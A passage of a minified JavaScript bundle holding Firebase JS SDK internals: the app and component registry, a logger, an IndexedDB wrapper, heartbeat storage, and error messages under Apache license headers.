c=this.inbuf_;for(;s<n;){if(c===0)for(;s<=i;)this.compress_(e,s),s+=this.blockSize;if(typeof e=="string"){for(;s<n;)if(o[c]=e.charCodeAt(s),++c,++s,c===this.blockSize){this.compress_(o),c=0;break}}else for(;s<n;)if(o[c]=e[s],++c,++s,c===this.blockSize){this.compress_(o),c=0;break}}this.inbuf_=c,this.total_+=n}digest(){const e=[];let n=this.total_*8;this.inbuf_<56?this.update(this.pad_,56-this.inbuf_):this.update(this.pad_,this.blockSize-(this.inbuf_-56));for(let s=this.blockSize-1;s>=56;s--)this.buf_[s]=n&255,n/=256;this.compress_(this.buf_);let i=0;for(let s=0;s<5;s++)for(let o=24;o>=0;o-=8)e[i]=this.chain_[s]>>o&255,++i;return e}}function mO(t,e){const n=new pO(t,e);return n.subscribe.bind(n)}class pO{constructor(e,n){this.observers=[],this.unsubscribes=[],this.observerCount=0,this.task=Promise.resolve(),this.finalized=!1,this.onNoObservers=n,this.task.then(()=>{e(this)}).catch(i=>{this.error(i)})}next(e){this.forEachObserver(n=>{n.next(e)})}error(e){this.forEachObserver(n=>{n.error(e)}),this.close(e)}complete(){this.forEachObserver(e=>{e.complete()}),this.close()}subscribe(e,n,i){let s;if(e===void 0&&n===void 0&&i===void 0)throw new Error("Missing Observer.");gO(e,["next","error","complete"])?s=e:s={next:e,error:n,complete:i},s.next===void 0&&(s.next=t0),s.error===void 0&&(s.error=t0),s.complete===void 0&&(s.complete=t0);const o=this.unsubscribeOne.bind(this,this.observers.length);return this.finalized&&this.task.then(()=>{try{this.finalError?s.error(this.finalError):s.complete()}catch{}}),this.observers.push(s),o}unsubscribeOne(e){this.observers===void 0||this.observers[e]===void 0||(delete this.observers[e],this.observerCount-=1,this.observerCount===0&&this.onNoObservers!==void 0&&this.onNoObservers(this))}forEachObserver(e){if(!this.finalized)for(let n=0;n<this.observers.length;n++)this.sendOne(n,e)}sendOne(e,n){this.task.then(()=>{if(this.observers!==void 0&&this.observers[e]!==void 0)try{n(this.observers[e])}catch(i){typeof console<"u"&&console.error&&console.error(i)}})}close(e){this.finalized||(this.finalized=!0,e!==void 0&&(this.finalError=e),this.task.then(()=>{this.observers=void 0,this.onNoObservers=void 0}))}}function gO(t,e){if(typeof t!="object"||t===null)return!1;for(const n of e)if(n in t&&typeof t[n]=="function")return!0;return!1}function t0(){}function tp(t,e){return`${t} failed: ${e} argument `}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const yO=function(t){const e=[];let n=0;for(let i=0;i<t.length;i++){let s=t.charCodeAt(i);if(s>=55296&&s<=56319){const o=s-55296;i++,ye(i<t.length,"Surrogate pair missing trail surrogate.");const c=t.charCodeAt(i)-56320;s=65536+(o<<10)+c}s<128?e[n++]=s:s<2048?(e[n++]=s>>6|192,e[n++]=s&63|128):s<65536?(e[n++]=s>>12|224,e[n++]=s>>6&63|128,e[n++]=s&63|128):(e[n++]=s>>18|240,e[n++]=s>>12&63|128,e[n++]=s>>6&63|128,e[n++]=s&63|128)}return e},np=function(t){let e=0;for(let n=0;n<t.length;n++){const i=t.charCodeAt(n);i<128?e++:i<2048?e+=2:i>=55296&&i<=56319?(e+=4,n++):e+=3}return e};/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function tn(t){return t&&t._delegate?t._delegate:t}class za{constructor(e,n,i){this.name=e,this.instanceFactory=n,this.type=i,this.multipleInstances=!1,this.serviceProps={},this.instantiationMode="LAZY",this.onInstanceCreated=null}setInstantiationMode(e){return this.instantiationMode=e,this}setMultipleInstances(e){return this.multipleInstances=e,this}setServiceProps(e){return this.serviceProps=e,this}setInstanceCreatedCallback(e){return this.onInstanceCreated=e,this}}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const ko="[DEFAULT]";/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class vO{constructor(e,n){this.name=e,this.container=n,this.component=null,this.instances=new Map,this.instancesDeferred=new Map,this.instancesOptions=new Map,this.onInitCallbacks=new Map}get(e){const n=this.normalizeInstanceIdentifier(e);if(!this.instancesDeferred.has(n)){const i=new Hd;if(this.instancesDeferred.set(n,i),this.isInitialized(n)||this.shouldAutoInitialize())try{const s=this.getOrInitializeService({instanceIdentifier:n});s&&i.resolve(s)}catch{}}return this.instancesDeferred.get(n).promise}getImmediate(e){var n;const i=this.normalizeInstanceIdentifier(e==null?void 0:e.identifier),s=(n=e==null?void 0:e.optional)!==null&&n!==void 0?n:!1;if(this.isInitialized(i)||this.shouldAutoInitialize())try{return this.getOrInitializeService({instanceIdentifier:i})}catch(o){if(s)return null;throw o}else{if(s)return null;throw Error(`Service ${this.name} is not available`)}}getComponent(){return this.component}setComponent(e){if(e.name!==this.name)throw Error(`Mismatching Component ${e.name} for Provider ${this.name}.`);if(this.component)throw Error(`Component for ${this.name} has already been provided`);if(this.component=e,!!this.shouldAutoInitialize()){if(wO(e))try{this.getOrInitializeService({instanceIdentifier:ko})}catch{}for(const[n,i]of this.instancesDeferred.entries()){const s=this.normalizeInstanceIdentifier(n);try{const o=this.getOrInitializeService({instanceIdentifier:s});i.resolve(o)}catch{}}}}clearInstance(e=ko){this.instancesDeferred.delete(e),this.instancesOptions.delete(e),this.instances.delete(e)}async delete(){const e=Array.from(this.instances.values());await Promise.all([...e.filter(n=>"INTERNAL"in n).map(n=>n.INTERNAL.delete()),...e.filter(n=>"_delete"in n).map(n=>n._delete())])}isComponentSet(){return this.component!=null}isInitialized(e=ko){return this.instances.has(e)}getOptions(e=ko){return this.instancesOptions.get(e)||{}}initialize(e={}){const{options:n={}}=e,i=this.normalizeInstanceIdentifier(e.instanceIdentifier);if(this.isInitialized(i))throw Error(`${this.name}(${i}) has already been initialized`);if(!this.isComponentSet())throw Error(`Component ${this.name} has not been registered yet`);const s=this.getOrInitializeService({instanceIdentifier:i,options:n});for(const[o,c]of this.instancesDeferred.entries()){const d=this.normalizeInstanceIdentifier(o);i===d&&c.resolve(s)}return s}onInit(e,n){var i;const s=this.normalizeInstanceIdentifier(n),o=(i=this.onInitCallbacks.get(s))!==null&&i!==void 0?i:new Set;o.add(e),this.onInitCallbacks.set(s,o);const c=this.instances.get(s);return c&&e(c,s),()=>{o.delete(e)}}invokeOnInitCallbacks(e,n){const i=this.onInitCallbacks.get(n);if(i)for(const s of i)try{s(e,n)}catch{}}getOrInitializeService({instanceIdentifier:e,options:n={}}){let i=this.instances.get(e);if(!i&&this.component&&(i=this.component.instanceFactory(this.container,{instanceIdentifier:_O(e),options:n}),this.instances.set(e,i),this.instancesOptions.set(e,n),this.invokeOnInitCallbacks(i,e),this.component.onInstanceCreated))try{this.component.onInstanceCreated(this.container,e,i)}catch{}return i||null}normalizeInstanceIdentifier(e=ko){return this.component?this.component.multipleInstances?e:ko:e}shouldAutoInitialize(){return!!this.component&&this.component.instantiationMode!=="EXPLICIT"}}function _O(t){return t===ko?void 0:t}function wO(t){return t.instantiationMode==="EAGER"}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class bO{constructor(e){this.name=e,this.providers=new Map}addComponent(e){const n=this.getProvider(e.name);if(n.isComponentSet())throw new Error(`Component ${e.name} has already been registered with ${this.name}`);n.setComponent(e)}addOrOverwriteComponent(e){this.getProvider(e.name).isComponentSet()&&this.providers.delete(e.name),this.addComponent(e)}getProvider(e){if(this.providers.has(e))return this.providers.get(e);const n=new vO(e,this);return this.providers.set(e,n),n}getProviders(){return Array.from(this.providers.values())}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */var ot;(function(t){t[t.DEBUG=0]="DEBUG",t[t.VERBOSE=1]="VERBOSE",t[t.INFO=2]="INFO",t[t.WARN=3]="WARN",t[t.ERROR=4]="ERROR",t[t.SILENT=5]="SILENT"})(ot||(ot={}));const xO={debug:ot.DEBUG,verbose:ot.VERBOSE,info:ot.INFO,warn:ot.WARN,error:ot.ERROR,silent:ot.SILENT},AO=ot.INFO,EO={[ot.DEBUG]:"log",[ot.VERBOSE]:"log",[ot.INFO]:"info",[ot.WARN]:"warn",[ot.ERROR]:"error"},TO=(t,e,...n)=>{if(e<t.logLevel)return;const i=new Date().toISOString(),s=EO[e];if(s)console[s](`[${i}]  ${t.name}:`,...n);else throw new Error(`Attempted to log a message with an invalid logType (value: ${e})`)};class ip{constructor(e){this.name=e,this._logLevel=AO,this._logHandler=TO,this._userLogHandler=null}get logLevel(){return this._logLevel}set logLevel(e){if(!(e in ot))throw new TypeError(`Invalid value "${e}" assigned to \`logLevel\``);this._logLevel=e}setLogLevel(e){this._logLevel=typeof e=="string"?xO[e]:e}get logHandler(){return this._logHandler}set logHandler(e){if(typeof e!="function")throw new TypeError("Value assigned to `logHandler` must be a function");this._logHandler=e}get userLogHandler(){return this._userLogHandler}set userLogHandler(e){this._userLogHandler=e}debug(...e){this._userLogHandler&&this._userLogHandler(this,ot.DEBUG,...e),this._logHandler(this,ot.DEBUG,...e)}log(...e){this._userLogHandler&&this._userLogHandler(this,ot.VERBOSE,...e),this._logHandler(this,ot.VERBOSE,...e)}info(...e){this._userLogHandler&&this._userLogHandler(this,ot.INFO,...e),this._logHandler(this,ot.INFO,...e)}warn(...e){this._userLogHandler&&this._userLogHandler(this,ot.WARN,...e),this._logHandler(this,ot.WARN,...e)}error(...e){this._userLogHandler&&this._userLogHandler(this,ot.ERROR,...e),this._logHandler(this,ot.ERROR,...e)}}const CO=(t,e)=>e.some(n=>t instanceof n);let qx,Gx;function SO(){return qx||(qx=[IDBDatabase,IDBObjectStore,IDBIndex,IDBCursor,IDBTransaction])}function NO(){return Gx||(Gx=[IDBCursor.prototype.advance,IDBCursor.prototype.continue,IDBCursor.prototype.continuePrimaryKey])}const LC=new WeakMap,I0=new WeakMap,VC=new WeakMap,n0=new WeakMap,Zv=new WeakMap;function RO(t){const e=new Promise((n,i)=>{const s=()=>{t.removeEventListener("success",o),t.removeEventListener("error",c)},o=()=>{n(Ma(t.result)),s()},c=()=>{i(t.error),s()};t.addEventListener("success",o),t.addEventListener("error",c)});return e.then(n=>{n instanceof IDBCursor&&LC.set(n,t)}).catch(()=>{}),Zv.set(e,t),e}function IO(t){if(I0.has(t))return;const e=new Promise((n,i)=>{const s=()=>{t.removeEventListener("complete",o),t.removeEventListener("error",c),t.removeEventListener("abort",c)},o=()=>{n(),s()},c=()=>{i(t.error||new DOMException("AbortError","AbortError")),s()};t.addEventListener("complete",o),t.addEventListener("error",c),t.addEventListener("abort",c)});I0.set(t,e)}let k0={get(t,e,n){if(t instanceof IDBTransaction){if(e==="done")return I0.get(t);if(e==="objectStoreNames")return t.objectStoreNames||VC.get(t);if(e==="store")return n.objectStoreNames[1]?void 0:n.objectStore(n.objectStoreNames[0])}return Ma(t[e])},set(t,e,n){return t[e]=n,!0},has(t,e){return t instanceof IDBTransaction&&(e==="done"||e==="store")?!0:e in t}};function kO(t){k0=t(k0)}function DO(t){return t===IDBDatabase.prototype.transaction&&!("objectStoreNames"in IDBTransaction.prototype)?function(e,...n){const i=t.call(i0(this),e,...n);return VC.set(i,e.sort?e.sort():[e]),Ma(i)}:NO().includes(t)?function(...e){return t.apply(i0(this),e),Ma(LC.get(this))}:function(...e){return Ma(t.apply(i0(this),e))}}function MO(t){return typeof t=="function"?DO(t):(t instanceof IDBTransaction&&IO(t),CO(t,SO())?new Proxy(t,k0):t)}function Ma(t){if(t instanceof IDBRequest)return RO(t);if(n0.has(t))return n0.get(t);const e=MO(t);return e!==t&&(n0.set(t,e),Zv.set(e,t)),e}const i0=t=>Zv.get(t);function OO(t,e,{blocked:n,upgrade:i,blocking:s,terminated:o}={}){const c=indexedDB.open(t,e),d=Ma(c);return i&&c.addEventListener("upgradeneeded",f=>{i(Ma(c.result),f.oldVersion,f.newVersion,Ma(c.transaction),f)}),n&&c.addEventListener("blocked",f=>n(f.oldVersion,f.newVersion,f)),d.then(f=>{o&&f.addEventListener("close",()=>o()),s&&f.addEventListener("versionchange",p=>s(p.oldVersion,p.newVersion,p))}).catch(()=>{}),d}const PO=["get","getKey","getAll","getAllKeys","count"],jO=["put","add","delete","clear"],r0=new Map;function Yx(t,e){if(!(t instanceof IDBDatabase&&!(e in t)&&typeof e=="string"))return;if(r0.get(e))return r0.get(e);const n=e.replace(/FromIndex$/,""),i=e!==n,s=jO.includes(n);if(!(n in(i?IDBIndex:IDBObjectStore).prototype)||!(s||PO.includes(n)))return;const o=async function(c,...d){const f=this.transaction(c,s?"readwrite":"readonly");let p=f.store;return i&&(p=p.index(d.shift())),(await Promise.all([p[n](...d),s&&f.done]))[0]};return r0.set(e,o),o}kO(t=>({...t,get:(e,n,i)=>Yx(e,n)||t.get(e,n,i),has:(e,n)=>!!Yx(e,n)||t.has(e,n)}));/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class LO{constructor(e){this.container=e}getPlatformInfoString(){return this.container.getProviders().map(n=>{if(VO(n)){const i=n.getImmediate();return`${i.library}/${i.version}`}else return null}).filter(n=>n).join(" ")}}function VO(t){const e=t.getComponent();return(e==null?void 0:e.type)==="VERSION"}const D0="@firebase/app",Qx="0.13.0";/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Ls=new ip("@firebase/app"),UO="@firebase/app-compat",BO="@firebase/analytics-compat",zO="@firebase/analytics",FO="@firebase/app-check-compat",HO="@firebase/app-check",qO="@firebase/auth",GO="@firebase/auth-compat",YO="@firebase/database",QO="@firebase/data-connect",KO="@firebase/database-compat",WO="@firebase/functions",$O="@firebase/functions-compat",XO="@firebase/installations",ZO="@firebase/installations-compat",JO="@firebase/messaging",eP="@firebase/messaging-compat",tP="@firebase/performance",nP="@firebase/performance-compat",iP="@firebase/remote-config",rP="@firebase/remote-config-compat",sP="@firebase/storage",aP="@firebase/storage-compat",oP="@firebase/firestore",lP="@firebase/ai",cP="@firebase/firestore-compat",uP="firebase",dP="11.8.0";/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const M0="[DEFAULT]",hP={[D0]:"fire-core",[UO]:"fire-core-compat",[zO]:"fire-analytics",[BO]:"fire-analytics-compat",[HO]:"fire-app-check",[FO]:"fire-app-check-compat",[qO]:"fire-auth",[GO]:"fire-auth-compat",[YO]:"fire-rtdb",[QO]:"fire-data-connect",[KO]:"fire-rtdb-compat",[WO]:"fire-fn",[$O]:"fire-fn-compat",[XO]:"fire-iid",[ZO]:"fire-iid-compat",[JO]:"fire-fcm",[eP]:"fire-fcm-compat",[tP]:"fire-perf",[nP]:"fire-perf-compat",[iP]:"fire-rc",[rP]:"fire-rc-compat",[sP]:"fire-gcs",[aP]:"fire-gcs-compat",[oP]:"fire-fst",[cP]:"fire-fst-compat",[lP]:"fire-vertex","fire-js":"fire-js",[uP]:"fire-js-all"};/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const fm=new Map,fP=new Map,O0=new Map;function Kx(t,e){try{t.container.addComponent(e)}catch(n){Ls.debug(`Component ${e.name} failed to register with FirebaseApp ${t.name}`,n)}}function Fo(t){const e=t.name;if(O0.has(e))return Ls.debug(`There were multiple attempts to register component ${e}.`),!1;O0.set(e,t);for(const n of fm.values())Kx(n,t);for(const n of fP.values())Kx(n,t);return!0}function rp(t,e){const n=t.container.getProvider("heartbeat").getImmediate({optional:!0});return n&&n.triggerHeartbeat(),t.container.getProvider(e)}function rr(t){return t==null?!1:t.settings!==void 0}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const mP={"no-app":"No Firebase App '{$appName}' has been created - call initializeApp() first","bad-app-name":"Illegal App name: '{$appName}'","duplicate-app":"Firebase App named '{$appName}' already exists with different options or config","app-deleted":"Firebase App named '{$appName}' already deleted","server-app-deleted":"Firebase Server App has been deleted","no-options":"Need to provide options, when not being deployed to hosting via source.","invalid-app-argument":"firebase.{$appName}() takes either no argument or a Firebase App instance.","invalid-log-argument":"First argument to `onLog` must be null or a function.","idb-open":"Error thrown when opening IndexedDB. Original error: {$originalErrorMessage}.","idb-get":"Error thrown when reading from IndexedDB. Original error: {$originalErrorMessage}.","idb-set":"Error thrown when writing to IndexedDB. Original error: {$originalErrorMessage}.","idb-delete":"Error thrown when deleting from IndexedDB. Original error: {$originalErrorMessage}.","finalization-registry-not-supported":"FirebaseServerApp deleteOnDeref field defined but the JS runtime does not support FinalizationRegistry.","invalid-server-app-environment":"FirebaseServerApp is not for use in browser environments."},Oa=new qd("app","Firebase",mP);/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class pP{constructor(e,n,i){this._isDeleted=!1,this._options=Object.assign({},e),this._config=Object.assign({},n),this._name=n.name,this._automaticDataCollectionEnabled=n.automaticDataCollectionEnabled,this._container=i,this.container.addComponent(new za("app",()=>this,"PUBLIC"))}get automaticDataCollectionEnabled(){return this.checkDestroyed(),this._automaticDataCollectionEnabled}set automaticDataCollectionEnabled(e){this.checkDestroyed(),this._automaticDataCollectionEnabled=e}get name(){return this.checkDestroyed(),this._name}get options(){return this.checkDestroyed(),this._options}get config(){return this.checkDestroyed(),this._config}get container(){return this._container}get isDeleted(){return this._isDeleted}set isDeleted(e){this._isDeleted=e}checkDestroyed(){if(this.isDeleted)throw Oa.create("app-deleted",{appName:this._name})}}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const tl=dP;function UC(t,e={}){let n=t;typeof e!="object"&&(e={name:e});const i=Object.assign({name:M0,automaticDataCollectionEnabled:!0},e),s=i.name;if(typeof s!="string"||!s)throw Oa.create("bad-app-name",{appName:String(s)});if(n||(n=DC()),!n)throw Oa.create("no-options");const o=fm.get(s);if(o){if(Ba(n,o.options)&&Ba(i,o.config))return o;throw Oa.create("duplicate-app",{appName:s})}const c=new bO(s);for(const f of O0.values())c.addComponent(f);const d=new pP(n,i,c);return fm.set(s,d),d}function Jv(t=M0){const e=fm.get(t);if(!e&&t===M0&&DC())return UC();if(!e)throw Oa.create("no-app",{appName:t});return e}function Kr(t,e,n){var i;let s=(i=hP[t])!==null&&i!==void 0?i:t;n&&(s+=`-${n}`);const o=s.match(/\s|\//),c=e.match(/\s|\//);if(o||c){const d=[`Unable to register library "${s}" with version "${e}":`];o&&d.push(`library name "${s}" contains illegal characters (whitespace or "/")`),o&&c&&d.push("and"),c&&d.push(`version name "${e}" contains illegal characters (whitespace or "/")`),Ls.warn(d.join(" "));return}Fo(new za(`${s}-version`,()=>({library:s,version:e}),"VERSION"))}/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const gP="firebase-heartbeat-database",yP=1,vd="firebase-heartbeat-store";let s0=null;function BC(){return s0||(s0=OO(gP,yP,{upgrade:(t,e)=>{switch(e){case 0:try{t.createObjectStore(vd)}catch(n){console.warn(n)}}}}).catch(t=>{throw Oa.create("idb-open",{originalErrorMessage:t.message})})),s0}async function vP(t){try{const n=(await BC()).transaction(vd),i=await n.objectStore(vd).get(zC(t));return await n.done,i}catch(e){if(e instanceof Gs)Ls.warn(e.message);else{const n=Oa.create("idb-get",{originalErrorMessage:e==null?void 0:e.message});Ls.warn(n.message)}}}async function Wx(t,e){try{const i=(await BC()).transaction(vd,"readwrite");await i.objectStore(vd).put(e,zC(t)),await i.done}catch(n){if(n instanceof Gs)Ls.warn(n.message);else{const i=Oa.create("idb-set",{originalErrorMessage:n==null?void 0:n.message});Ls.warn(i.message)}}}function zC(t){return`${t.name}!${t.options.appId}`}/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const _P=1024,wP=30;class bP{constructor(e){this.container=e,this._heartbeatsCache=null;const n=this.container.getProvider("app").getImmediate();this._storage=new AP(n),this._heartbeatsCachePromise=this._storage.read().then(i=>(this._heartbeatsCache=i,i))}async triggerHeartbeat(){var e,n;try{const s=this.container.getProvider("platform-logger").getImmediate().getPlatformInfoString(),o=$x();if(((e=this._heartbeatsCache)===null||e===void 0?void 0:e.heartbeats)==null&&(this._heartbeatsCache=await this._heartbeatsCachePromise,((n=this._heartbeatsCache)===null||n===void 0?void 0:n.heartbeats)==null)||this._heartbeatsCache.lastSentHeartbeatDate===o||this._heartbeatsCache.heartbeats.some(c=>c.date===o))return;if(this._heartbeatsCache.heartbeats.push({date:o,agent:s}),this._heartbeatsCache.heartbeats.length>wP){const c=EP(this._heartbeatsCache.heartbeats);this._heartbeatsCache.heartbeats.splice(c,1)}return this._storage.overwrite(this._heartbeatsCache)}catch(i){Ls.warn(i)}}async getHeartbeatsHeader(){var e;try{if(this._heartbeatsCache===null&&await this._heartbeatsCachePromise,((e=this._heartbeatsCache)===null||e===void 0?void 0:e.heartbeats)==null||this._heartbeatsCache.heartbeats.length===0)return"";const n=$x(),{heartbeatsToSend:i,unsentEntries:s}=xP(this._heartbeatsCache.heartbeats),o=um(JSON.stringify({version:2,heartbeats:i}));return this._heartbeatsCache.lastSentHeartbeatDate=n,s.length>0?(this._heartbeatsCache.heartbeats=s,await this._storage.overwrite(this._heartbeatsCache)):(this._heartbeatsCache.heartbeats=[],this._storage.overwrite(this._heartbeatsCache)),o}catch(n){return Ls.warn(n),""}}}function $x(){return new Date().toISOString().substring(0,10)}function xP(t,e=_P){const n=[];let i=t.slice();for(const s of t){const o=n.find(c=>c.agent===s.agent);if(o){if(o.dates.push(s.date),Xx(n)>e){o.dates.pop();break}}else if(n.push({agent:s.agent,dates:[s.date]}),Xx(n)>e){n.pop();break}i=i.slice(1)}return{heartbeatsToSend:n,unsentEntries:i}}class AP{constructor(e){this.app=e,this._canUseIndexedDBPromise=this.runIndexedDBEnvironmentCheck()}async runIndexedDBEnvironmentCheck(){return aO()?oO().then(()=>!0).catch(()=>!1):!1}async read(){if(await this._canUseIndexedDBPromise){const n=await vP(this.app);return n!=null&&n.heartbeats?n:{heartbeats:[]}}else return{heartbeats:[]}}async overwrite(e){var n;if(await this._canUseIndexedDBPromise){const s=await this.read();return Wx(this.app,{lastSentHeartbeatDate:(n=e.lastSentHeartbeatDate)!==null&&n!==void 0?n:s.lastSentHeartbeatDate,heartbeats:e.heartbeats})}else return}async add(e){var n;if(await this._canUseIndexedDBPromise){const s=await this.read();return Wx(this.app,{lastSentHeartbeatDate:(n=e.lastSentHeartbeatDate)!==null&&n!==void 0?n:s.lastSentHeartbeatDate,heartbeats:[...s.heartbeats,...e.heartbeats]})}else return}}function Xx(t){return um(JSON.stringify({version:2,heartbeats:t})).length}function EP(t){if(t.length===0)return-1;let e=0,n=t[0].date;for(let i=1;i<t.length;i++)t[i].date<n&&(n=t[i].date,e=i);return e}/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function TP(t){Fo(new za("platform-logger",e=>new LO(e),"PRIVATE")),Fo(new za("heartbeat",e=>new bP(e),"PRIVATE")),Kr(D0,Qx,t),Kr(D0,Qx,"esm2017"),Kr("fire-js","")}TP("");var Zx=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{};/** @license
Copyright The Closure Library Authors.
SPDX-License-Identifier: Apache-2.0
*/var Pa,FC;(function(){var t;/** @license

 Copyright The Closure Library Authors.
 SPDX-License-Identifier: Apache-2.0
